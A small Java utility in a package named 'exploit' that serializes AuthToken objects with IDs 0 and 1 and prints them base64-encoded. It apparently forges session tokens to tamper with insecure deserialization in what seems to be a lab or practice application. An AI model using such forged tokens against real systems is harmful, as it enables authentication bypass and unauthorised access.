package utils.exploit;

import models.AuthToken;

import java.io.*;
import java.util.Base64;
public class DoSerialize {

    public static void run() throws Exception{
        AuthToken authToken = new AuthToken(0);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bos);
        out.writeObject(authToken);
        String finalToken = new String(Base64.getEncoder().encode(bos.toByteArray()));
        out.writeObject(authToken);
        out.close();
        System.out.println(finalToken);

        authToken = new AuthToken(1);
        bos = new ByteArrayOutputStream();
        out = new ObjectOutputStream(bos);
        out.writeObject(authToken);
        finalToken = new String(Base64.getEncoder().encode(bos.toByteArray()));
        out.writeObject(authToken);
        out.close();
        System.out.println(finalToken);
    }
}
